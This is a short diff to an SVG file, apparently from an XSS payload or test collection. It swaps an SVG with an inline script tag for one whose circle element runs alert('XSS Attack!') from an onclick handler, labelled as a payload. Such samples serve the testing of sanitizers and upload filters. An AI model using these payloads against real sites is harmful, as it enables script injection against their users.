@@ -1,3 +1,4 @@
-  <svg xmlns="http://www.w3.org/2000/svg">
-        <script>alert('XSS Attack!');</script>
-    </svg>
+<!-- Payload: SVG with event handler -->
+<svg xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" onclick="alert('XSS Attack!')"/>
+</svg>
